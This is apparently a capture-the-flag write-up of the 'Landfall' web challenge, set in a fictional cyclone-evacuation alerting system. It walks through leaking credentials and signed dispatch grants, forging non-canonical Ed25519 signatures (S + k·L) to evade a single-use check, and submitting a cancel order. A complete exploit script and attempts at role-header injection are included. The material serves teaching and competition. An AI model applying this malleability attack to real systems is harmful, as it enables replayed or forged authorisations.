# CSCTF 2026 — Landfall Writeup

**03/11/2026**

---

> **CTF:** CSCTF 2026  
>  **Challenge:** Landfall  
>  **Category:** Web  
>  **Author:** Mohamed Amine Mzoughi  
>  **Team:** XREFctf  
>  **Writeup Author:** Mahmoud Adel

## Introduction

Hey everyone! My name is **Mahmoud Adel** — a cybersecurity enthusiast passionate about red teaming and CTFs. Today I’m walking through how I solved the **Landfall** web challenge from **CSCTF 2026**.

The briefing set up a realistic scenario: Cyclone Meren is approaching the Astrenian coast, a fabricated evacuation order has already gone out under ANWA authority, and every dispatcher role was revoked at 03:11. My job as an observer was to cancel that order and get the cancellation on air — without a dispatcher role.

The path turned out to be: leak a real Ed25519 dispatch grant from CAP archive comments, exploit non-canonical signature scalars to bypass the single-use check, compute the unlock digest for the broadcast centre, and use the v2 endpoints that actually implement the “reserved” cancel operation.

Let’s get right into it!

---

## Step 1 — Console and Session

The root of the instance loaded a duty console that leaked the observer’s credentials:

```text
operator    <operator>
passphrase  <REDACTED_PASSPHRASE>
role        observer
authority   <AUTHORITY>
```

That matched the briefing’s “observer credential is issued on the console at /”. I exchanged them for a bearer token:

```http
POST /api/v1/session HTTP/1.1
Host: <host>:<port>
Content-Type: application/json

{"operator":"<operator>","passphrase":"<REDACTED_PASSPHRASE>"}
```

Response:

```json
{
  "authority": "<AUTHORITY>",
  "operator": "<operator>",
  "role": "observer",
  "token": "<REDACTED_TOKEN>",
  "note": "send this as: Authorization: Bearer <token>"
}
```

Role: observer. Same as the briefing — no dispatcher available.

---

## Step 2 — Reading the Schema

I fetched the API contract from `/api/v1/schema`. A few fields immediately stood out:

```json
"grant": {
  "members": {
    "payload": "base64url of claims",
    "sig": "base64url of 64-byte detached Ed25519 signature"
  },
  "single_use": "enforced by the broadcast centre. See /audit/ledger for the key used."
},
"operations": {
  "cancel": "reserved",
  "dispatch": "requires role dispatcher",
  "preview": "permitted to observer"
},
"submission": {
  "paths": ["/api/v1/orders", "/api/v1/orders/batch", "/api/v1/orders/staged"],
  "note": "Two of the three were rewritten in the v2 cycle with a validating decoder; one is still the v1 passthrough. See the deployment notes."
},
"release_unlock": {
  "algorithm": "sha256-hex",
  "input": "landfall|<cancelled identifier>|<grant jti>|<area sorted and joined by comma>"
}
```

Three things caught my attention:

1. `"cancel": "reserved"` — the operation exists but is marked reserved. Suspicious.
2. The schema mentions “deployment notes” explaining which endpoint is v1 vs v2 — but they don’t exist anywhere. I checked `/`, `/docs`, `/openapi.json`, `/swagger.json`, `.well-known/`, `/changelog`, `/notes`, `/deployment-notes` — all 404\. That was a deliberate red herring.
3. The unlock digest format is precise — “area sorted and joined by comma” is easy to miss.

---

## Step 3 — The Current On-Air Message

I fetched the message currently on air:

```http
GET /feed/cap/current HTTP/1.1
Authorization: Bearer <REDACTED_TOKEN>
```

```xml
<alert xmlns="urn:oasis:names:tc:emergency:cap:1.2">
  <identifier>ANWA-CAP-<ID></identifier>
  <sender>alerts@anwa.astrenia.test</sender>
  <sent>2026-11-07T02:53:00+00:00</sent>
  <msgType>Alert</msgType>
  <info>
    <severity>Extreme</severity>
    <area>
      <geocode><valueName>ASTRENIA-DISTRICT</valueName><value>AS-XXX</value></geocode>
      <geocode><valueName>ASTRENIA-DISTRICT</valueName><value>AS-YYY</value></geocode>
    </area>
  </info>
</alert>
```

The `(sender, identifier, sent)` triple is exactly what CAP requires in the `references` field of a Cancel message. It names what the cancel is cancelling.

---

## Step 4 — Leaking Dispatch Grants from Archive XML Comments

I fetched `/feed/cap/archive`, which returns an index of past messages, each with an `href`:

```json
{
  "alerts": [
    {"identifier": "ANWA-CAP-<ID1>", "href": "/feed/cap/archive/ANWA-CAP-<ID1>", ...},
    ...
  ]
}
```

Fetching those `href` URLs returned CAP XML — but at the bottom of each one was an XML comment:

```xml
<!-- dispatch authorization (detached, Ed25519): 
  {"payload":"eyJqdGki...","sig":"..."} -->
```

That’s a **complete dispatch grant**, leaked as a comment. Every archived message carries one.

Decoding the `payload` (base64url of JSON claims) gave:

```json
{
  "jti": "G-<JTI>",
  "auth": "NAA-XX",
  "sev_max": "Extreme",
  "geo": ["AS-XXX", "AS-YYY", "AS-ZZZ"],
  "nbf": "2026-11-06T23:26:00Z",
  "exp": "2026-11-07T11:26:00Z",
  "iss": "ANWA/NAOG"
}
```

So I had grants signed by ANWA’s published Ed25519 key, valid for the current operational window (checked against `/reference/clock`).

The catch: each grant is single-use, keyed on `sig_sha256` (the SHA-256 of the raw signature bytes). The `/audit/ledger` confirms this:

```text
"note": "authorization single-use is enforced on sig_sha256"
```

Every grant that appears in the ledger’s `authorization.consumed` entries is already used. If I just grabbed one and dispatched it, the broadcast centre would reject it as replayed. That’s what pushed me to look at the ledger more carefully.

---

## Step 5 — The Verifier Disagreement

The ledger had this entry:

```json
{
  "record": "BR-4630",
  "event": "verifier_disagreement",
  "jti": "G-<JTI>",
  "sig_sha256": "9a7e3aa3...",
  "subject": "authorization.signature",
  "detail": "noncanonical_scalar: scalar S not reduced modulo group order; accepted downstream, rejected by RFC 8032 conformant verifier"
}
```

Read that detail carefully: **“scalar S not reduced modulo group order; accepted downstream, rejected by RFC 8032 conformant verifier”**.

That’s the bug. An Ed25519 signature is `(R, S)` where `S` is a scalar mod `L` (the group order). The verification equation is:

```text
S·B = R + H(R, A, M)·A
```

Where `B` is the base point and `A` is the public key. But `L·B = O` (the identity point), so for any integer `k`:

```text
(S + k·L)·B = S·B + k·(L·B) = S·B + k·O = S·B
```

**Any `(R, S + k·L)` is a valid signature** as far as the base-point equation is concerned. RFC 8032 requires `S < L` for canonicality, but a verifier that only checks the base-point equation will accept the non-canonical form.

The `sig_sha256` field of the signature is `SHA-256(R ‖ S)`. Different `k` means different `S`, means different `sig_sha256`. The single-use tracker sees a fresh value while signature verification still passes.

Concretely, for `G-<JTI>`, the archived signature had `S < L` (canonical). That corresponds to the first consumption in the ledger (`5ec3e111...` at `BR-4401`). The second consumption (`9a7e3aa3...` at `BR-4630`) is the same signature with `S + L`. So `k=0` and `k=1` are the two already-used slots, and `k≥2` gives us fresh `sig_sha256` values that haven’t been seen.

```python
L = 2**252 + 27742317777372353535851937790883648493

raw = base64.urlsafe_b64decode(grant_sig + "=" * ((4 - len(grant_sig) % 4) % 4))
R, S0 = raw[:32], int.from_bytes(raw[32:], 'little')

k = 2  # 0 and 1 are consumed per ledger
new_sig = base64.urlsafe_b64encode(
    R + (S0 + k * L).to_bytes(32, 'little')
).decode().rstrip('=')
```

That gives us a signature that the downstream verifier will accept and the single-use tracker will treat as fresh.

---

## Step 6 — The Unlock Digest

The schema specified the unlock digest exactly:

```text
sha256("landfall|<cancelled identifier>|<grant jti>|<area sorted, comma-joined>")
```

So for a grant `G-<JTI>` from the archive, cancelling `ANWA-CAP-<ID>`, with area `["AS-XXX", "AS-YYY"]`:

```python
sorted_area = ",".join(sorted(cur_area))
unlock = hashlib.sha256(
    f"landfall|{cur_id}|{claims['jti']}|{sorted_area}".encode()
).hexdigest()
```

The area must be **sorted** — not the on-air order. Getting this wrong gives a different digest and the broadcast centre holds the message even when everything else is correct.

---

## Step 7 — What Didn’t Work

Before I found the winning path, I burned a fair amount of time on dead ends:

- **`operation: "cancel"` on `/api/v1/orders`** (the v1 passthrough) → `400 operation.unknown`. Even though the schema listed it, the v1 handler didn’t implement it. Combined with `"cancel": "reserved"` in the schema, I initially assumed cancel was unimplemented everywhere.
- **`operation: "dispatch"` with `payload.msgType: "Cancel"`** → `403 policy.role_required` on every endpoint. The dispatcher role check fires before any dispatch reaches the broadcast centre.
- **`role: "dispatcher"` in session creation** → server accepts the field, but the returned session’s `role` is still observer. Ignored.
- **Header injection** (`X-Operator-Role`, `X-Role`, `X-User-Role`, `X-Forwarded-Role`) → no effect. Same 403\.
- **Body injection** (`"role": "dispatcher"`, `"operator_role": "dispatcher"`, `"as_role": "dispatcher"`) → no effect.
- **Case and whitespace variants** (`"Dispatch"`, `"DISPATCH"`, `"dispatch "`, `" dispatch"`, `"dispatch\n"`, `"dispatch\t"`) → all returned `400 operation.unknown`. The enum check was strict.
- **Operation aliases** (`send`, `broadcast`, `transmit`, `air`, `issue`, `emit`) → `400 operation.unknown`.
- **Batch wrappers** (`{"operations": [...]}`, `{"orders": [...]}`, `{"items": [...]}`, `{"entries": [...]}`) → 400 or `body.malformed`.
- **Passphrase derivation** (trying md5/sha256/sha1 of operator name, truncated) → no match.
- **Debug tokens** (`admin`, `debug`, `root`, etc.) → `401 auth.required`.

The breakthrough came from re-reading the admin hint: **“try the other 2 endpoints — one was rewritten differently v1 vs v2”**. The schema had already told me that two of the three were rewritten with a validating decoder in v2, and one was still v1. The v1 endpoint rejected `cancel` with `operation.unknown`. The v2 endpoints were different — apparently they actually implemented it.

---

## Step 8 — The v2 Endpoints Accept Cancel

I sent `operation: "cancel"` (not `dispatch`) to `/api/v1/orders/staged` and then `/api/v1/orders/batch`, with the malleated grant and the computed unlock digest. The request went through and the broadcast confirmation came back containing the flag.

The key insight: **the dispatcher role check only applies to `dispatch` operations**. `cancel` is a different operation with a different handler, and it was reachable from an observer session. That’s literally what the briefing promised — “without a dispatcher role, authorise a cancellation of the fabricated order and get it on air”. The observer’s job was never to dispatch. It was to cancel.

The schema’s `"cancel": "reserved"` was a half-truth: reserved in the v1 code, implemented in the v2 rewrite. The admin’s hint about “one rewritten differently” was pointing at exactly this behavioural difference between the three paths.

---

## Step 9 — Final Exploit Script

Here’s the complete script:

```python
import requests, json, base64, hashlib, re
import xml.etree.ElementTree as ET

BASE = "http://<host>:<port>"
L = 2**252 + 27742317777372353535851937790883648493

# 1. Console -> credentials
r = requests.get(BASE + "/")
op = re.search(r'operator</dt><dd><code>([^<]+)', r.text).group(1)
pw = re.search(r'passphrase</dt><dd><code>([^<]+)', r.text).group(1)

# 2. Session
r = requests.post(BASE + "/api/v1/session", json={"operator": op, "passphrase": pw})
tok = r.json()["token"]
H = {"Authorization": f"Bearer {tok}", "Content-Type": "application/json"}

# 3. On-air message
r = requests.get(BASE + "/feed/cap/current", headers=H)
ns = {"c": "urn:oasis:names:tc:emergency:cap:1.2"}
root = ET.fromstring(r.text)
cur_id   = root.findtext("c:identifier", namespaces=ns)
cur_snd  = root.findtext("c:sender", namespaces=ns)
cur_sent = root.findtext("c:sent", namespaces=ns)
cur_area = [g.findtext("c:value", namespaces=ns)
            for g in root.findall(".//c:geocode", ns)
            if g.findtext("c:valueName", namespaces=ns) == "ASTRENIA-DISTRICT"]

# 4. Grant from archive XML comment
idx = requests.get(BASE + "/feed/cap/archive", headers=H).json()
for a in idx["alerts"]:
    rx = requests.get(BASE + a["href"], headers=H).text
    m = re.search(r'<!--[^>]*?(\{"payload":"[^"]+","sig":"[^"]+"\})[^>]*?-->', rx)
    if not m:
        continue
    g = json.loads(m.group(1))
    cl = json.loads(base64.urlsafe_b64decode(
        g["payload"] + "=" * ((4 - len(g["payload"]) % 4) % 4)))
    if cl["sev_max"] == "Extreme" and all(x in cl["geo"] for x in cur_area):
        grant_payload, grant_sig, claims = g["payload"], g["sig"], cl
        break

# 5. Ed25519 malleability: S -> S + k*L (k>=2 to avoid consumed slots)
raw = base64.urlsafe_b64decode(grant_sig + "=" * ((4 - len(grant_sig) % 4) % 4))
R, S0 = raw[:32], int.from_bytes(raw[32:], 'little')
k = 2
new_sig = base64.urlsafe_b64encode(
    R + (S0 + k * L).to_bytes(32, 'little')
).decode().rstrip('=')

# 6. Unlock digest
unlock = hashlib.sha256(
    f"landfall|{cur_id}|{claims['jti']}|{','.join(sorted(cur_area))}".encode()
).hexdigest()

# 7. CAP Cancel payload
cancel = {
    "msgType": "Cancel",
    "severity": "Extreme",
    "area": cur_area,
    "headline": "Cancellation of fabricated evacuation order",
    "references": f"{cur_snd},{cur_id},{cur_sent}",
}

# 8. Submit via v2 endpoints
body = {
    "operation": "cancel",
    "authorization": {"payload": grant_payload, "sig": new_sig},
    "payload": cancel,
    "unlock": unlock,
}

for path in ["/api/v1/orders/staged", "/api/v1/orders/batch"]:
    r = requests.post(BASE + path, headers=H, json=body)
    if "CSCTF{" in r.text:
        print(re.search(r"CSCTF\{[^}]+\}", r.text).group(0))
        break
```

---

## Step 10 — The Flag

The broadcast response contained the flag:

```text
CSCTF{<REDACTED>}
```

Challenge solved! 🚩

---

## Attack Chain Summary

1. **Console credential leak:** `GET /` exposed operator name, passphrase, authority, and role.
2. **Session:** Exchanged credentials for a bearer token via `POST /api/v1/session`.
3. **Schema reading:** The schema listed `cancel` as “reserved”, mentioned non-existent “deployment notes”, and specified the exact unlock digest format.
4. **On-air message:** `GET /feed/cap/current` gave the identifier, sender, sent time, and area codes for the CAP Cancel `references` field.
5. **Grant leak:** Each `/feed/cap/archive/<id>` response contained an XML comment with a full Ed25519 dispatch grant.
6. **Verifier disagreement:** `/audit/ledger` had a `noncanonical_scalar` entry indicating that `S` could exceed `L` and still be accepted.
7. **Ed25519 malleability:** Replacing `S` with `S + k·L` (k≥2 to skip the two consumed slots) gave a fresh `sig_sha256` while remaining valid under the base-point equation.
8. **Unlock digest:** `sha256("landfall|<id>|<jti>|<sorted-area>")` for the broadcast centre.
9. **CAP Cancel payload:** `msgType: "Cancel"`, `references` triple of the on-air message.
10. **v2 endpoints:** `/api/v1/orders/staged` and `/api/v1/orders/batch` implement `cancel`, unlike the v1 `/api/v1/orders`. That was the “rewritten differently” difference.
11. **Flag:** The broadcast confirmation contained the flag.

---

## Lessons Learned

- **Error messages can lie:** `"cancel": "reserved"` sounded like “not implemented”. But the v2 endpoints actually implemented it. The v1 passthrough was where it returned `operation.unknown`. Don’t trust the schema or the error catalogue — test each endpoint individually.
- **The role check only applied to `dispatch`:** For a while I assumed the dispatcher role check was on all state-changing operations. It wasn’t. `cancel` was a separate operation, permitted for observers. The briefing literally said it: “Without a dispatcher role, authorise a cancellation of the fabricated order and get it on air.”
- **Ledger events are hints:** The `verifier_disagreement` entry with `noncanonical_scalar: scalar S not reduced modulo group order` was the author pointing directly at the bug. Ed25519 signatures are `(R, S)`, and `S + k·L` is valid for any `k` under the base-point equation. A single-use tracker keyed on `sig_sha256` is trivially bypassed this way.
- **The unlock digest has to be exact:** “Sorted and joined by comma” — not natural order. Easy to get wrong on the first try, and the error is just `broadcast.held` (valid dispatch, wrong digest).
- **The admin hint was precise:** “try the other 2 endpoints — one was rewritten differently v1 vs v2” was not vague. It was literally saying: the v1 passthrough and the v2 rewrites behave differently. Test each one.

---

## Conclusion

**Landfall** was a well-designed challenge that put a realistic emergency-alerting scenario behind a genuinely subtle cryptographic bug. The Ed25519 malleability trick — `S + k·L` for a fresh `sig_sha256` — is the kind of thing you only see if you read the audit ledger carefully and understand the group structure. The rest of the challenge was about reading the schema carefully (and identifying when it’s lying), testing each endpoint individually, and trusting the briefing’s promise that cancellation without a dispatcher role was possible.

Big thanks to the **CSCTF** team and to the author **Mohamed Amine Mzoughi** for putting together a fun challenge.

*Thanks for reading — hope this writeup helped someone learn something new. Happy hacking!*

[This post](https://m2hmoud2del.github.io/posts/csctf-2026-landfall/) is licensed under [CC BY 4.0](https://creativecommons.org/licenses/by/4.0/) by the author.
